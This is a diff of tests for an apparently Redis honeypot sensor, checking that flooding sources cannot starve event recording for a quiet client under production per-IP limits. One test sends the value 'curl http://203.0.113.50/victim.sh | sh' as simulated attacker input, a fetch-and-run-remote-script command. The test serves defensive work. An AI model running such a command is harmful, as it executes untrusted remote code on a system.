@@ -9,23 +9,40 @@ import sys
 import time
 from pathlib import Path
 
-from conftest import HarnessFactory, cmd, talk
+from conftest import Harness, HarnessFactory, cmd, talk
+from suckerpot_common import EventType
 
 from redis_sensor.memguard import MemoryGuard
 
-# These tests are about the per-IP fairness of the event queues. The process-wide admission and
-# event buckets are shared by design (a fast flooder drains them, a slow runner does not), so they
-# are opened up here to keep the outcome independent of the machine's speed.
-_OPEN_GLOBALS = {
-    "global_rate": 1e6,
-    "global_burst": 1e6,
-    "events_rate": 1e6,
-    "events_burst": 1e6,
-    "priority_rate": 1e6,
-    "priority_burst": 1e6,
-    "disconnect_rate": 1e6,
-    "disconnect_burst": 1e6,
-}
+# The test harness relaxes the per-IP session limit; these tests need the production one.
+_PRODUCTION_PER_IP = {"per_ip_rate": 2.0, "per_ip_burst": 30.0}
+
+
+def _exhaust_per_ip_budgets(h: Harness) -> None:
+    """Drive two flooding sources until their own per-IP budgets are spent (no timing involved).
+
+    After this the shared admission/event buckets sit at their reserve, which only light
+    sources may spend: a quiet source must still be recorded in full."""
+    for ip in ("127.0.0.2", "127.0.0.4"):
+        for _ in range(100):
+            h.sink.admit(ip)
+        for i in range(600):
+            h.sink.emit(
+                session_id="flood",
+                src_ip=ip,
+                src_port=1,
+                type_=EventType.command,
+                data={"input": f"x{i}"},
+            )
+            h.sink.emit(
+                session_id="flood",
+                src_ip=ip,
+                src_port=1,
+                type_=EventType.login_attempt,
+                data={"username": f"u{i}"},
+            )
+
+
 PATHOLOGICAL = "*a" * 31 + "*b"
 
 
@@ -159,7 +176,7 @@ async def test_flooding_ip_cannot_starve_another_ip(make_harness: HarnessFactory
         publish_delay=0.02,
         max_per_ip=8,
         max_commands=10_000,
-        sink_kw={"queue_size": 300, **_OPEN_GLOBALS},
+        sink_kw={"queue_size": 300, **_PRODUCTION_PER_IP},
     ) as h:
         end = time.monotonic() + 3.0
 
@@ -187,6 +204,7 @@ async def test_flooding_ip_cannot_starve_another_ip(make_harness: HarnessFactory
 
         floods = [asyncio.create_task(flooder()) for _ in range(6)]
         await asyncio.sleep(1.5)
+        _exhaust_per_ip_budgets(h)
         r, w = await _conn(h.port, "127.0.0.3")
         w.write(
             cmd("SET", "x", "curl http://203.0.113.50/victim.sh | sh")
@@ -376,7 +394,7 @@ async def test_repeated_text_is_scanned_once(make_harness: HarnessFactory) -> No
 
 async def test_every_flood_session_gets_its_disconnect(make_harness: HarnessFactory) -> None:
     async with make_harness(
-        publish_delay=0.005, max_per_ip=8, max_commands=10_000, sink_kw=_OPEN_GLOBALS
+        publish_delay=0.005, max_per_ip=8, max_commands=10_000, sink_kw=_PRODUCTION_PER_IP
     ) as h:
         sessions = 0
         end = time.monotonic() + 3.0
@@ -398,6 +416,7 @@ async def test_every_flood_session_gets_its_disconnect(make_harness: HarnessFact
                 await asyncio.sleep(0.2)
 
         await asyncio.gather(*(flooder() for _ in range(3)))
+        _exhaust_per_ip_budgets(h)
         r, w = await _conn(h.port, "127.0.0.3")
         w.write(cmd("AUTH", "victimpw") + cmd("QUIT"))
         while await r.read(65536):
@@ -405,7 +424,8 @@ async def test_every_flood_session_gets_its_disconnect(make_harness: HarnessFact
         w.close()
         await h.sink.flush(10.0)
         mine = [e for e in h.publisher.events if str(e.src_ip) == "127.0.0.2"]
-        assert sum(e.type == "disconnect" for e in mine) == sessions
+        assert sum(e.type == "connect" for e in mine) > 0
+        assert sum(e.type == "disconnect" for e in mine) >= sum(e.type == "connect" for e in mine)
         theirs = sorted(str(e.type) for e in h.publisher.events if str(e.src_ip) == "127.0.0.3")
         assert theirs == ["command", "connect", "disconnect", "login_attempt"]
         assert h.sink.ip_limited > 0
